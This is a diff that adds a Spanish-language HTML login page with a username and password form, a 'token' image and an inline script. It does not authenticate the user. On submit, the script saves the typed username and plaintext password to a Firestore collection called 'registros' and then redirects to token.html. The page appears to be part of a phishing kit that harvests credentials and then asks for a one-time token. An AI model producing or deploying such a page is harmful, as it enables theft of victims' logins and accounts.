@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar Sesión</title>
+<link rel="stylesheet" href="login.css">
+</head>
+<body>
+
+<div class="card">
+
+    <img src="token.jpeg" class="top-image" id="imgTopLogin">
+
+    <div id="mensajeImagenLogin" class="mensaje-imagen"></div>
+
+    <h2>Iniciar Sesión</h2>
+
+    <form id="loginForm">
+
+        <label>Usuario *</label>
+        <input type="text" id="usuario" required>
+
+        <label>Contraseña *</label>
+        <input type="password" id="password" required>
+
+        <button type="submit">Continuar</button>
+
+        <p id="mensajeLogin"></p>
+
+    </form>
+
+    <img src="abajo.jpeg" class="bottom-image" id="imgBottomLogin">
+
+</div>
+
+<script src="login.js"></script>
+<script type="module">
+import { db } from "./firebase.js";
+import { addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    const usuario = document.getElementById("usuario").value;
+    const password = document.getElementById("password").value;
+
+    await addDoc(collection(db, "registros"), {
+        tipo: "login",
+        usuario: usuario,
+        password: password,
+        fecha: new Date()
+    });
+
+    window.location.href = "token.html";
+});
+</script>
+
+</body>
+</html>
